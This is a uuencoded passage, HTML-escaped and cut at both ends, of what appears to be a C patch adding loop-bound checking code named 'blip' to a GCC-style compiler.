M;6ET+FQI;6ET*2D@/&quot;`S,BE[#0T**PD)#0T**PD)8FQI&lt;%]W87)N:6YG*%-%
M3$9?0TA%0TLL(F)L:7`Z(&#039;9A&lt;B!S;6%L;&amp;5R(&#039;1H96X@;&amp;]N9R(I.PD-#0HK
M&quot;0ER971U&lt;FX@3E5,3#L-#0HK&quot;7T-#0HK&quot;0T-&quot;BL)&lt;W=I=&amp;-H*%12145?0T]$
M12`H;&amp;]O&lt;%]L:6UI=&quot;YS=&amp;UT*2E[&quot;0T-&quot;BL-#0HK&quot;6-A&lt;V4@5TA)3$5?4U1-
M5#H-#0HK&quot;6-A&lt;V4@1D]27U-4350Z#0T**PT-&quot;BL)&quot;0T-&quot;BL)&quot;2\J(&amp;EN(&amp;QO
M;W`@;V8@=&#039;EP92!W:&amp;EL92AL96XM+2D@9V-C(&amp;9O&lt;B!S;VUE(&#039;)E87-O;B!P
M&lt;F5F97(@=&amp;\@8V]M&lt;&amp;%R92`-#0HK&quot;0D@*B!T:&amp;4@&lt;F5S=6QT(&amp;]F(&quot;)L96XM
M+2(@=&amp;\@82!V86QU92!I;G-T96%D(&amp;]F(&amp;-O;7!A&lt;FEN9R`B;&amp;5N(BX@#0T*
M*PD)(&quot;H@*&#039;1O(&#039;-A=F4@&lt;F5G:7-T97)S(&#039;=H:6-H(&amp;]L9&quot;!L96X_*2!T:&amp;4@
M&lt;F5S=6QT(&amp;ES(&#039;1H870@9V-C(&amp;%S&lt;W5M92`-#0HK&quot;0D@*B!T:&amp;%T(#`@+2T@
M=VEL;&quot;!B96-O;64@,&#039;AF9F9F9F9F9B!E=F5N(&amp;EF(&#039;1H92!L;V]P(&amp;ES(&#039;5N
M&lt;VEG;F5D(&quot;$A+@T-&quot;BL)&quot;2`J(%1O(&#039;)E&lt;&#039;)E&lt;V5N=&quot;!T:&amp;4@&lt;F5A;&quot;!D:7-T
M86YC92!W92!W:6QL(&amp;-H86YG92!T:&amp;ES(&#039;9A;&#039;5E(&#039;1O(#`N(&quot;HO#0T**PD)
M:68H;&amp;]O&lt;%]L:6UI=&quot;YD:7(@/3T@1$5#4D5-14Y4(&quot;8F#0T**PD)&quot;512145?
M0T].4U1!3E0H;&amp;]O&lt;%]L:6UI=&quot;YL:6UI=&quot;D@)B8-#0HK&quot;0D)5%)%15])3E1?
M0U-47TQ/5RAL;V]P7VQI;6ET+FQI;6ET*2`]/2`P&gt;$9&amp;1D9&amp;1D9&amp;*7L-#0HK
M&quot;0D);&amp;]O&lt;%]L:6UI=&quot;YL:6UI=&quot;`](&amp;EN=&amp;5G97)?&gt;F5R;U]N;V1E.PD)#0T*
M*PD)?0T-&quot;BL)#0T**PD-#0HK&quot;0DO*B!C;VYV97)T(&#039;1H92!L:6UI=&quot;!A;F0@
M8V]U;G0@:6YT;R!U;G-I9VYE9&quot;!I;G0@:68@=&amp;AE&gt;2!A&lt;F4@;F]T(`T-&quot;BL)
M&quot;2`J(&amp;%L;&#039;)E861Y(&#039;-O+B!4:&amp;ES(&amp;-O;G9E&lt;G1I;VX@:7,@;F]T(&#039;-U&lt;&#039;!O
M&lt;V4@=&amp;\@969F96-T(&#039;1H92!R96%L(`T-&quot;BL)&quot;2`J(&#039;9A&lt;G,N+B`Z*2`J+PT-
M&quot;BL)&quot;6EF*&quot;%44D5%7U5.4TE&#039;3D5$*&amp;QO;W!?;&amp;EM:70N8V]U;G1E&lt;BD@)B8-
M#0HK&quot;0D)(512145?0T].4U1!3E0H;&amp;]O&lt;%]L:6UI=&quot;YC;W5N=&amp;5R*2E[#0T*
M*PD)&quot;6QO;W!?;&amp;EM:70N8V]U;G1E&lt;B`](&amp;)U:6QD,2`H0T].5D525%]%6%!2
M+&amp;QO;F=?=6YS:6=N961?=&#039;EP95]N;V1E+`T-&quot;BL)&quot;0D)&quot;0D)&quot;0D);&amp;]O&lt;%]L
M:6UI=&quot;YC;W5N=&amp;5R*3L-#0HK&quot;0E]#0T**PD)#0T**PD):68H(512145?54Y3
M24=.140H;&amp;]O&lt;%]L:6UI=&quot;YL:6UI=&quot;D@)B8-#0HK&quot;0D)(512145?0T].4U1!
M3E0H;&amp;]O&lt;%]L:6UI=&quot;YL:6UI=&quot;DI&gt;PT-&quot;BL)&quot;0EL;V]P7VQI;6ET+FQI;6ET
M(#T@8G5I;&amp;0Q(&quot;A#3TY615)47T584%(L;&amp;]N9U]U;G-I9VYE9%]T&gt;7!E7VYO
M9&amp;4L#0T**PD)&quot;0D)&quot;0D)&quot;0EL;V]P7VQI;6ET+FQI;6ET*3L-#0HK&quot;0E]#0T*
M*PD)#0T**PD)#0T**PD)+RH@8V]N&lt;W1R=6-T(&#039;1H92!C:&amp;5C:R!E&gt;&#039;!R97-S
M:6]N&lt;R!D97!E;F1I;F&lt;@;VX@;&amp;]O&lt;&quot;!D:7)E8W1I;VX@*B\-#0HK&quot;0EI9BAL
M;V]P7VQI;6ET+F1I&lt;B`]/2!)3D-214U%3E0I&gt;PT-&quot;BL)&quot;0EM:6YU&lt;R`](&amp;)U
M:6QD(&quot;A-24Y54U]%6%!2+&amp;]P7W1T+`T-&quot;BL)&quot;0D)&quot;0D);&amp;]O&lt;%]L:6UI=&quot;YL
M:6UI=&quot;QL;V]P7VQI;6ET+F-O=6YT97(I.PT-&quot;BL)#0T**PD)&quot;6]P,5]G=%]O
M&lt;#(@/2!B=6EL9&quot;`H1U1?15A04BQB;V]L96%N7W1Y&lt;&amp;5?;F]D92P-#0HK&quot;0D)
M&quot;0D)&quot;0EL;V]P7VQI;6ET+FQI;6ET+&amp;QO;W!?;&amp;EM:70N8V]U;G1E&lt;BD[#0T*
M*PD)?0T-&quot;BL)&quot;65L&lt;V5[#0T**PD)&quot;6UI;G5S(#T@8G5I;&amp;0@*$U)3E537T58
M4%(L;W!?=&#039;0L#0T**PD)&quot;0D)&quot;0EL;V]P7VQI;6ET+F-O=6YT97(L;&amp;]O&lt;%]L
M:6UI=&quot;YL:6UI=&quot;D[#0T**PD)&quot;0T-&quot;BL)&quot;0EO&lt;#%?9W1?;W`R(#T@8G5I;&amp;0@
M*$=47T584%(L8F]O;&amp;5A;E]T&gt;7!E7VYO9&amp;4L#0T**PD)&quot;0D)&quot;0D);&amp;]O&lt;%]L
M:6UI=&quot;YC;W5N=&amp;5R+&amp;QO;W!?;&amp;EM:70N;&amp;EM:70I.PT-&quot;BL)&quot;7T)#0T**PD-
M#0HK&quot;0DO*B!I9B!A;GD@;V8@=&amp;AE(&amp;5X&lt;&#039;)E&lt;W-I;VYS(&#039;=A&lt;R!N;W0@8W)E
M871E9&quot;P@9F%I;&quot;`J+PT-&quot;BL)&quot;6EF*&quot;%M:6YU&lt;R!\?&quot;`A;W`Q7V=T7V]P,BD@
M&lt;F5T=7)N($Y53$P[#0T**PD-#0HK&quot;0EM:6YU&lt;U]G=%]M87@@/2!B=6EL9&quot;`H
M1U1?15A04BQB;V]L96%N7W1Y&lt;&amp;5?;F]D92QM:6YU&lt;RQB;&amp;EP7VUA&gt;&quot;D[#0T*
M*PD):68H(6UI;G5S7V=T7VUA&gt;&quot;D@&lt;F5T=7)N($Y53$P[#0T**PD)#0T**PD)
M=%]A;F1I9B`](&amp;)U:6QD(&quot;A44E542%]!3D1)1E]%6%!2+&amp;)O;VQE86Y?=&#039;EP
M95]N;V1E+`T-&quot;BL)&quot;0D)&quot;0EO&lt;#%?9W1?;W`R+&amp;UI;G5S7V=T7VUA&gt;&quot;D[#0T*
M*PD-#0HK&quot;0EI9B@A=%]A;F1I9BD@&lt;F5T=7)N($Y53$P[#0T**PD)#0T**PD)
M8V]N9%]T97-T(#T@=%]A;F1I9CL-#0HK&quot;0EC;W5N=&quot;`](&amp;UI;G5S.PD-#0HK
M&quot;0D-#0HK&quot;0EB&lt;F5A:SL-#0HK&quot;0T-&quot;BL)8V%S92!#04Q,7T584%(Z#0T**PT-
M&quot;BL)&quot;6EF*%12145?54Y324=.140H;&amp;]O&lt;%]L:6UI=&quot;YL:6UI=&quot;D@)B8-#0HK
M&quot;0D)(512145?0T].4U1!3E0H;&amp;]O&lt;%]L:6UI=&quot;YL:6UI=&quot;DI&gt;PT-&quot;BL)&quot;0EL
M;V]P7VQI;6ET+FQI;6ET(#T@8G5I;&amp;0Q(&quot;A#3TY615)47T584%(L;&amp;]N9U]U
M;G-I9VYE9%]T&gt;7!E7VYO9&amp;4L#0T**PD)&quot;0D)&quot;0D)&quot;0EL;V]P7VQI;6ET+FQI
M;6ET*3L-#0HK&quot;0E]#0T**PT-&quot;BL)&quot;6]P7V=T7VUA&gt;&quot;`](&amp;)U:6QD(&quot;A&#039;5%]%
M6%!2+&amp;)O;VQE86Y?=&#039;EP95]N;V1E+&amp;QO;W!?;&amp;EM:70N;&amp;EM:70L8FQI&lt;%]M
M87@I.PT-&quot;BL)&quot;6EF*&quot;%O&lt;%]G=%]M87@I(&#039;)E=&#039;5R;B!.54Q,.PT-&quot;BL-#0HK
M&quot;0EC;VYD7W1E&lt;W0@/2!O&lt;%]G=%]M87@[#0T**PD)8V]U;G0@/2!L;V]P7VQI
M;6ET+FQI;6ET.PT-&quot;BL)&quot;0T-&quot;BL)&quot;6)R96%K.PT-&quot;BL-#0HK&quot;61E9F%U;&#039;0Z
M&lt;F5T=7)N($Y53$P[&quot;0T-&quot;BL)?0T-&quot;BL)&quot;0T-&quot;BL)8FQI&lt;%]V:6]L871I;VY?
M8V%L;&quot;`](&amp;)L:7!?8G5I;&amp;1?=FEO;&amp;%T:6]N7V-A;&amp;PH8V]U;G0I.PT-&quot;BL)
M:68H(6)L:7!?=FEO;&amp;%T:6]N7V-A;&amp;PI(&#039;)E=&#039;5R;B!.54Q,.PT-&quot;BL)#0T*
M*PDO*B!N;W&lt;@=V4@=VEL;&quot;!B=6EL9&quot;!T:&amp;4@0T].1%]%6%!2(&#039;5S:6YG(&#039;1H
M92!G=&quot;!A&lt;R!T:&amp;4@8V]N9&amp;ET:6]N#0T**PD@*B!A(&amp;-A;&amp;P@=&amp;\@;W5R(&amp;)L
M:7!?=FEO;&amp;%T:6]N(&amp;9U;F-T:6]N(&amp;EF(&amp;-O;F1I=&amp;EO;B!I&lt;R!T&lt;G5E+&quot;!A
M;F0@#0T**PD@*B!T:&amp;4@87)G(&quot;)E&gt;&#039;`B(&amp;%S(&amp;9A;&#039;-E(&amp;5X&lt;&quot;!O9B!T:&amp;4@
M0T].1%]%6%!2(&quot;HO#0T**PEC;VYD7V5X&lt;&quot;`](&amp;)U:6QD(&quot;A#3TY$7T584%(L
M=&#039;0L8V]N9%]T97-T+&amp;)L:7!?=FEO;&amp;%T:6]N7V-A;&amp;PL#0T**PD)&quot;0D@97AP
M(#\@97AP(#H@:6YT96=E&lt;E]Z97)O7VYO9&amp;4I.PT-&quot;BL-#0HK&quot;7)E=&#039;5R;B!C
M;VYD7V5X&lt;#L-#0HK?0T-&quot;BL-#0HK#0T**R\J($-R96%T92!A;B!%6%!27U-4
M350@=VET:&quot;!A($-/3D1?15A04B!I;G-I9&amp;4L(&#039;=H:6-H(&amp;-H96-K(&amp;9O&lt;B!B
M;&amp;EP(`T-&quot;BL@*B!C;VYD:71I;VXN(&quot;HO#0T**PT-&quot;BMT&lt;F5E#0T**V)L:7!?
M8G5I;&amp;1?8VAE8VM?&lt;W1M=&quot;AE&gt;&#039;`I#0T**PET&lt;F5E&quot;65X&lt;#L-#0HK&gt;PT-&quot;BL-
M#0HK&quot;71R964)8VAE8VM?&lt;W1M=#TP.PT-&quot;BL)=&#039;)E90EC:&amp;5C:U]E&gt;&#039;`],#L-
M#0HK#0T**PEC:&amp;5C:U]E&gt;&#039;`@/2!B;&amp;EP7V)U:6QD7V-H96-K7V5X&lt;&quot;AE&gt;&#039;`I
M.PT-&quot;BL):68H(6-H96-K7V5X&lt;&quot;D@&lt;F5T=7)N($Y53$P[#0T**PD-#0HK&quot;6-H
M96-K7W-T;70@/2!B=6EL9%]S=&amp;UT*$584%)?4U1-5&quot;P@8VAE8VM?97AP*3L-
M#0HK#0T**PER971U&lt;FX@8VAE8VM?&lt;W1M=#L-#0HK?0T-&quot;BL-#0HK#0T**R\J
M&quot;6%D9&quot;!A($-/3D1?15A04B!T;R!T:&amp;4@9F]R(&amp;EN:70@&lt;W1M=&quot;X@5&amp;AE(&amp;%D
M9&amp;ET:6]N(&amp;-H96-K(&#039;=I;&amp;P@8F4@:6X@80T-&quot;BL@*@EF;W)M870@;V8@82!N
M97&lt;@15A04E]35$U4(&amp;)Y(&amp;UA:VEN9R!T:&amp;4@8W5R&lt;F5N=&quot;!F;W(@:6YI=&quot;!S
M=&amp;UT(&amp;$@#0T**R`J&quot;4-/35!/54Y$7U-4350@86YD(&amp;-H86EN9R!T:&amp;4@;F5W
M($584%)?4U1-5&quot;!A=&quot;!T:&amp;4@96YD(&amp;]F(&#039;1H92!E&gt;&amp;ES=&amp;EN9R!O;F4N(`T-
M&quot;BL@*B\-#0HK(`T-&quot;BMB;V]L(&quot;`-#0HK8FQI&lt;%]E;6ET7V9O&lt;E]L;V]P7V-H
M96-K&lt;RAF;W)?&lt;W1M=&quot;D-#0HK&quot;71R964)9F]R7W-T;70[#0T**PD)#0T**WL-
M#0HK#0T**PET&lt;F5E&quot;69O&lt;E]I;FET.PT-&quot;BL)=&#039;)E90EC;VUP;W5N9%]E&gt;&#039;!R
M.PT-&quot;BL)=&#039;)E90EB;&amp;EP7V5X&lt;#L-#0HK#0T**PEF;W)?:6YI=&quot;`]($9/4E])
M3DE47U-4350@*&amp;9O&lt;E]S=&amp;UT*3L-#0HK#0T**PDO*B!(86YD;&amp;4@;VYL&gt;2!C
M87-E&lt;R!W:&amp;5R92!F;W(@:6YI=&quot;!I&lt;R!E&gt;&#039;!R97-S:6]N+B`J+PT-&quot;BL):68H
M5%)%15]#3T1%(&quot;AF;W)?:6YI=&quot;D@(3T@15A04E]35$U4*2![#0T**PD)8FQI
M&lt;%]W87)N:6YG*$Y%7T9/4BP-#0HK&quot;0D)(F)L:7`Z(&amp;9O&lt;B!I;FET(&amp;ES(&amp;YO
M=&quot;!%6%!27U-4350B*3L)#0T**PD)&lt;F5T=7)N(&amp;9A;&#039;-E.PT-&quot;BL)?0T-&quot;BL)
M#0T**PDO*B!B=6EL9&quot;!A(&amp;)L:7`@8VAE8VL@=7-I;F&lt;@=&amp;AE(&amp;=L;V)A;&quot;!L
M;V]P7VQI;6ET(&quot;HO#0T**PEB;&amp;EP7V5X&lt;&quot;`](&amp;)L:7!?8G5I;&amp;1?8VAE8VM?
M97AP*$Y53$Q?5%)%12D[#0T**PEI9B@A8FQI&lt;%]E&gt;&#039;`I&gt;PT-&quot;BL)&quot;6)L:7!?
M=V%R;FEN9RA.15]&amp;3U(L#0T**PD)&quot;2)B;&amp;EP.B!I;G1E&lt;FYA;&quot;!F86EL=7)E
M(&#039;=H:6QE(&amp;)U:6QD:6YG(&amp;-H96-K(&amp;5X&lt;&#039;)E&lt;W-I;VXB*3L)#0T**PD)&lt;F5T
M=7)N(&amp;9A;&#039;-E.PT-&quot;BL)?0T-&quot;BL-#0HK&quot;6EF*%12145?3U!%4D%.1&quot;`H9F]R
M7VEN:70L,&quot;D@/3T@3E5,3%]44D5%*7L-#0HK&quot;0E44D5%7T]015)!3D0@*&amp;9O
M&lt;E]I;FET+#`I(#T@8FQI&lt;%]E&gt;&#039;`[#0T**PE]#0T**PEE;&#039;-E&gt;PT-&quot;BL)&quot;2\J
M(&amp;-O;G-T&lt;F%C=&quot;!A(&amp;YE=R!C;VUP;W5N9&quot;!E&gt;&#039;!R97-S:6]N(&quot;HO#0T**PD)
M8V]M&lt;&amp;]U;F1?97AP&lt;B`](&amp;)U:6QD*$-/35!/54Y$7T584%(L=F]I9%]T&gt;7!E
M7VYO9&amp;4L#0T**PD)&quot;0D)&quot;0D)5%)%15]/4$5204Y$(&quot;AF;W)?:6YI=&quot;PP*2P-
M#0HK&quot;0D)&quot;0D)&quot;0EB;&amp;EP7V5X&lt;&quot;D[#0T**PD-#0HK&quot;0EI9B@A8V]M&lt;&amp;]U;F1?
M97AP&lt;BD@&lt;F5T=7)N(&amp;9A;&#039;-E.PT-&quot;BL)#0T**PD)+RH@&lt;F5P;&amp;%C92!C=7)R
M96YT(&amp;9O&lt;B!I;FET(&amp;5X&lt;&#039;)E&lt;W-I;VX@=VET:&quot;!T:&amp;4@;F5W(&amp;-O;7!O=6YD
M(`T-&quot;BL)&quot;2`J(&amp;5X&lt;&#039;)E&lt;W-I;VX@*B\-#0HK&quot;0D-#0HK&quot;0E44D5%7T]015)!
M3D0@*&amp;9O&lt;E]I;FET+#`I(#T@8V]M&lt;&amp;]U;F1?97AP&lt;CL-#0HK&quot;7T-#0HK&quot;0T-
M&quot;BL)&lt;F5T=7)N(&#039;1R=64[#0T**PD-#0HK?0T-&quot;BL-#0HK+RH)861D(&amp;$@0T].
M1%]%6%!2(&amp;)E9F]R92!T:&amp;4@5TA)3$5?4U1-5&quot;X@5&amp;AE(&amp;%D9&amp;ET:6]N(&amp;-H
M96-K(&#039;=I;&amp;P@8F4@:6X@80T-&quot;BL@*@EF;W)M870@;V8@82!N97&lt;@15A04E]3
M5$U4+B!3:6YC92!W92!A&lt;F4@8V%L;&amp;5D(&amp;EN(&amp;$@&lt;W1A=&amp;4@=VAE&lt;F4@=&amp;AE
M(`T-&quot;BL@*@E72$E,15]35$U4(&#039;=A&lt;R!N;W0@&gt;65T(&amp;%D9&amp;5D(&#039;1O(&#039;1H92!T
M&lt;F5E+B!W92!W:6QL(&#039;-I;7!L&gt;2!A9&amp;0@;W5R(&amp;-O;F0N(`T-&quot;BL@*B\-#0HK
M(`T-&quot;BMB;V]L(&quot;`-#0HK8FQI&lt;%]E;6ET7W=H:6QE7VQO;W!?8VAE8VMS*&quot;D-
M#0HK&gt;PT-&quot;BL)=&#039;)E90EB;&amp;EP7W-T;70[#0T**PD)#0T**PEB;&amp;EP7W-T;70@
M/2!B;&amp;EP7V)U:6QD7V-H96-K7W-T;70H3E5,3%]44D5%*3L-#0HK&quot;6EF*&quot;%B
M;&amp;EP7W-T;70I(&#039;)E=&#039;5R;B!F86QS93L-#0HK&quot;0T-&quot;BL)861D7W-T;70H8FQI
M&lt;%]S=&amp;UT*3L-#0HK&quot;0T-&quot;BL)&lt;F5T=7)N(&#039;1R=64[#0T**WT-#0HK#0T**PT-
M&quot;BLO*B!C;VYV97)T(&amp;$@0T%,3%]%6%!2(&#039;1O(&amp;$@0T].1%]%6%!2(&amp;AA=FEN
M9R!T:&amp;4@8FQI&lt;&quot;!C:&amp;5C:W,@87,@=&amp;AE(&amp;-O;F0N#0T**R`J(&amp;%N9&quot;!T:&amp;4@
M;W)I9VEN86P@0T%,3%]%6%!2(&amp;%S(&#039;1H92!F86QS92!S:61E(&amp;]F(&#039;1H92!E
M&gt;&#039;!R97-S:6]N+B`J+R`-#0HK#0T**W1R964@(`T-&quot;BMB;&amp;EP7V5M:71?8V%L
M;%]C:&amp;5C:W,H8V%L;&quot;D-#0HK&quot;71R964)8V%L;#L-#0HK&quot;0D-#0HK&gt;PT-&quot;BL)
M=&#039;)E90EC:&amp;5C:U]E&gt;&#039;`[#0T**PT-&quot;BL)8VAE8VM?97AP(#T@8FQI&lt;%]B=6EL
M9%]C:&amp;5C:U]E&gt;&#039;`H8V%L;&quot;D[(`T-&quot;BL-#0HK&quot;2\J(&amp;EF(&#039;=E(&amp;9A:6QE9&quot;!T
M;R!C;VYV97)T(&#039;1H92!E&gt;&#039;`@:6YT;R!O=7(@8VAE8VLL(`T-&quot;BL)(&quot;H@=&amp;AE
M;B!R971U&lt;FX@=&amp;AE(&amp;]R:6=I;F%L(&amp;5X&lt;&#039;(@*B\-#0HK&quot;6EF*&quot;%C:&amp;5C:U]E
M&gt;&#039;`I(&#039;)E=&#039;5R;B!C86QL.PT-&quot;BL-#0HK&quot;7)E=&#039;5R;B!C:&amp;5C:U]E&gt;&#039;`[#0T*
M*WT-#0HK#0T**R\J(&amp;-H96-K(&amp;EF(&amp;$@9&amp;5C;&quot;!I&lt;R!P87)T(&amp;]F(&amp;$@&lt;W1M
M=&quot;!O&lt;B!A;B!E&gt;&#039;!R(&amp;%S(&amp;$@;&#039;9A;&#039;5E#0T**R`J(&amp;EF(&amp;ET(&amp;ES(&#039;1H96X@
M8V]N&lt;VED97(@:70@87,@;6]D:69I960@#0T**R`J#0T**R`J(%1H:7,@9G5N
M8W1I;VX@:7,@&lt;F5C=7)S:79E(&amp;%N9&quot;!T:&amp;4@&lt;W1O&lt;&quot;!C;VYI=&amp;EO;B!I&lt;R!E
M:71H97(-#0HK(&quot;H@+2!A(&#039;-I;7!L92!E&gt;&#039;!R(&#039;=A&lt;R!F;W5N9&quot;!W:&amp;EC:&quot;!A
M;&amp;QO=R!U&lt;R!T;R!F:6=U&lt;F4@;W5T(&#039;1H870@#0T**R`J(`D@=&amp;AE(&amp;1E8VP@
M:7,@;6]D:69I960N#0T**R`J(&quot;T@82!F=6YC=&amp;EO;B!R96%C:&quot;!A(&#039;-T;70@
M+R!E&gt;&#039;!R(&#039;1O(&amp;-O;7!L97@@=&amp;\@=F5R9FEY#0T**R`J(`D@*&#039;=E(&amp;-A;B!C
M:&amp;5A=&quot;!I;B!F:7)S=&quot;!V97)S:6]N(&amp;%N9&quot;!C;&amp;%I;2!T:&amp;%T(&amp;%L;6]S=&quot;!E
M=F5R&gt;71H:6YG#0T**R`J(`D@:7,@=&amp;]O(&amp;AA&lt;F0@=&amp;\@:61E;G1I9GD@&lt;V\@
M&lt;F5C=7)S:79E(&amp;5N9&quot;!W:&amp;EL92!S=7!P;W)T:6YG(&amp;]N;&#039;D@#0T**R`J(`D@
M8F%S:6,@&lt;W1U9F8@*2HO#0T**PT-&quot;BL-#0HK#0T**V)O;VP-#0HK8FQI&lt;%]D
M96-L7VUO9&amp;EF:65D(&quot;AD96-L+&#039;0I#0T**PET&lt;F5E(&amp;1E8VP[#0T**PET&lt;F5E
M(&#039;0[#0T**WL-#0HK&quot;6EN=&quot;!I.PT-&quot;BL)=&#039;)E90EE&gt;&#039;`[#0T**PD-#0HK&quot;6EF
M*&quot;%T*2!R971U&lt;FX@9F%L&lt;V4[#0T**PD-#0HK&quot;7-W:71C:&quot;A44D5%7T-/1$4@
M*&#039;0I*7L-#0HK#0T**PDO*B!H86YD;&amp;4@:VYO=VX@&lt;VEM&lt;&amp;QE(&amp;-A&lt;V5S(&#039;=H
M:6-H(&amp;ES(&#039;1Y&lt;&amp;EC86P@=&amp;\@8V]U;G1E&lt;B`-#0HK&quot;2`J(&amp;UO9&amp;EF:6-A=&amp;EO
M;G,@*B\-#0HK&quot;0D-#0HK&quot;0EC87-E($U/1$E&amp;65]%6%!2.@T-&quot;BL)&quot;0DO*B!O
M;FQY(&#039;1A:V4@8V%R92!O9B!C87-E(&amp;QI:V4@*ST@+3T@34]$24997T584%(@
M=VAE&lt;F4@9&amp;5C;&quot;`-#0HK&quot;0D)(&quot;H@:7,@;VX@;&amp;5F=&quot;!S:61E(&amp;%N9&quot;!A;&#039;-O
M(&amp;]N(&#039;)I9VAT(&#039;-I9&amp;4@=&amp;]G871H97(@=VET:&quot;!A(`T-&quot;BL)&quot;0D@*B!C;VYS
M=&amp;%N=&quot;`J+PT-&quot;BL)&quot;0EE&gt;&#039;`@/2!44D5%7T]015)!3D0@*&#039;0L,2D[#0T**PD)
M&quot;6EF*`E44D5%7T]015)!3D0@*&#039;0L,&quot;D@/3T@9&amp;5C;&quot;`F)@T-&quot;BL)&quot;0D)97AP
M(&quot;8F#0T**PD)&quot;0E44D5%7T]015)!3D0@*&amp;5X&lt;&quot;PP*2`]/2!D96-L(&quot;8F#0T*
M*PD)&quot;0E44D5%7T]015)!3D0@*&amp;5X&lt;&quot;PQ*2`F)@T-&quot;BL)&quot;0D)5%)%15]#3TY3
M5$%.5&quot;`H5%)%15]/4$5204Y$(&quot;AE&gt;&#039;`L,2DI*7L-#0HK#0T**PT-&quot;BL)&quot;0D)
M:68H5%)%15]#3T1%(&quot;AE&gt;&#039;`I(#T](%!,55-?15A04BE[#0T**PD)&quot;0D);&amp;]O
M&lt;%]L:6UI=&quot;YD:7(@/2!)3D-214U%3E0[#0T**PD)&quot;0D)&lt;F5T=7)N(&#039;1R=64[
M#0T**PD)&quot;0E]#0T**PD)&quot;0D-#0HK&quot;0D)&quot;6EF*%12145?0T]$12`H97AP*2`]
M/2!-24Y54U]%6%!2*7L-#0HK&quot;0D)&quot;0EL;V]P7VQI;6ET+F1I&lt;B`]($1%0U)%
M345.5#L-#0HK&quot;0D)&quot;0ER971U&lt;FX@=&#039;)U93L-#0HK&quot;0D)&quot;7T-#0HK#0T**PD)
M&quot;0ER971U&lt;FX@=&#039;)U93L-#0HK&quot;0D)?0T-&quot;BL)&quot;0EE;&#039;-E#0T**PD)&quot;0ER971U
M&lt;FX@9F%L&lt;V4[#0T**PT-&quot;BL)&quot;0D-#0HK&quot;0EC87-E(%!214E.0U)%345.5%]%
M6%!2.@T-&quot;BL)&quot;6-A&lt;V4@4$]35$E.0U)%345.5%]%6%!2.@T-&quot;BL)&quot;0T-&quot;BL)
M&quot;0EI9BAD96-L(#T](%12145?3U!%4D%.1&quot;`H=&quot;PP*2E[#0T**PD)&quot;0EL;V]P
M7VQI;6ET+F1I&lt;B`]($E.0U)%345.5#L-#0HK&quot;0D)&quot;7)E=&#039;5R;B!T&lt;G5E.PT-
M&quot;BL)&quot;0E]#0T**PD)&quot;0T-&quot;BL)&quot;0EB&lt;F5A:SL-#0HK#0T**PD)8V%S92!03U-4
M1$5#4D5-14Y47T584%(Z#0T**PD)8V%S92!04D5$14-214U%3E1?15A04CH-
M#0HK&quot;0D)#0T**PD)&quot;0T-&quot;BL)&quot;0EI9BAD96-L(#T](%12145?3U!%4D%.1&quot;`H
M=&quot;PP*2E[#0T**PD)&quot;0EL;V]P7VQI;6ET+F1I&lt;B`]($1%0U)%345.5#L-#0HK
M&quot;0D)&quot;7)E=&#039;5R;B!T&lt;G5E.PT-&quot;BL)&quot;0E]#0T**PD)&quot;0T-&quot;BL)&quot;0EB&lt;F5A:SL-
M#0HK#0T**PD)8V%S92!,5%]%6%!2.@T-&quot;BL)&quot;6-A&lt;V4@3$5?15A04CH-#0HK
M&quot;0EC87-E($=%7T584%(Z#0T**PD)8V%S92!&#039;5%]%6%!2.@T-&quot;BL)&quot;6-A&lt;V4@
M15%?15A04CH-#0HK&quot;0EC87-E($Y%7T584%(Z#0T**PT-&quot;BL)&quot;0DO*B!I;B!T
M:&amp;4@8V%S92!O9B!S:6UP;&amp;4@8V]N9&amp;ET:6]N+&quot;!C:&amp;5C:R!F;W(@;6]D:69I
M8V%T:6]N(&amp;]F#0T**PD)&quot;2`J(&amp;]N92!O9B!T:&amp;4@&lt;VED97,N(%1H:7,@=VEL
M;&quot;!H96QP(&#039;5S(&amp;EN(&amp;-A&lt;V5S(&amp;QI:V4@#0T**PD)&quot;2`J(&#039;=H:6QE*&amp;QE;BTM
M*2`J+PT-&quot;BL-#0HK&quot;0D)9F]R*&amp;D],#MI(#P@,CL@:2LK*7L-#0HK#0T**PD)
M&quot;0EI9BAB;&amp;EP7V1E8VQ?;6]D:69I960H9&amp;5C;&quot;`L(%12145?3U!%4D%.1&quot;AT
M+&amp;DI*2D-#0HK&quot;0D)&quot;0ER971U&lt;FX@=&#039;)U93L-#0HK&quot;0D)?0T-&quot;BL-#0HK&quot;0D)
M&lt;F5T=7)N(&amp;9A;&#039;-E.PT-&quot;BL-#0HK&quot;0D)#0T**PD)9&amp;5F875L=#H-#0HK&quot;0D)
M&lt;F5T=7)N(&amp;9A;&#039;-E.PT-&quot;BL)&quot;0T-&quot;BL)?0T-&quot;BL-#0HK&quot;7)E=&#039;5R;B!F86QS
M93L)#0T**WT-#0HK#0T**R\J(&amp;9I;F0@82!D96-L(&amp;]U=&quot;!O9B!P87)E;G0@
M97AP&lt;B!O&lt;&amp;5R86YD+B!M;W-T(&#039;-I;7!L92!C87-E(&amp;ES(&#039;=H96X-#0HK(&quot;H@
M;W`@:7,@=&amp;AE(&amp;1E8VP@:71S96QF+B!A;F]T:&amp;5R(&#039;-U&lt;&#039;!O&lt;G1E9&quot;!C87-E
M(&amp;ES(&#039;=H96X@=&amp;AE(&amp;]P(&amp;ES(&amp;$-#0HK(&quot;H@;6]D:69Y(&amp;]R(&amp;EN8W)E;65N
M=&quot;`O(&amp;1E8W)E;65N=&quot;!E&gt;&#039;!R+&quot;!I;B!T:&amp;ES(&amp;-A&lt;V4@=&amp;AE(&amp;9I&lt;G-T(&amp;]P
M97)A;F0-#0HK(&quot;H@=VEL;&quot;!B92!T:&amp;4@;&amp;]O:V5D(&amp;9O&lt;B!D96-L+B`-#0HK
M(&quot;H-#0HK(&quot;H@:6X@8V%S97,@;W1H97(@=&amp;AE;B!T:&amp;]S92P@=V4@=VEL;&quot;!N
M;W0@9FEN9&quot;!T:&amp;4@9&amp;5C;&quot;X@*B\-#0HK#0T**W1R964-#0HK8FQI&lt;%]F:6YD
M7V1E8VPH;W`I#0T**PET&lt;F5E(&amp;]P.PT-&quot;BM[#0T**PT-&quot;BL)&lt;W=I=&amp;-H*&quot;!4
M4D5%7T-/1$4H;W`I*7L-#0HK&quot;0EC87-E(%9!4E]$14-,.@T-&quot;BL)&quot;6-A&lt;V4@
M4$%235]$14-,.@T-&quot;BL)&quot;6-A&lt;V4@1DE%3$1?1$5#3#H-#0HK&quot;0EC87-E($E.
M5$5&#039;15)?0U-4.@T-&quot;BL-#0HK&quot;0D)&lt;F5T=7)N(&amp;]P.PT-&quot;BL)&quot;0D-#0HK&quot;0DO
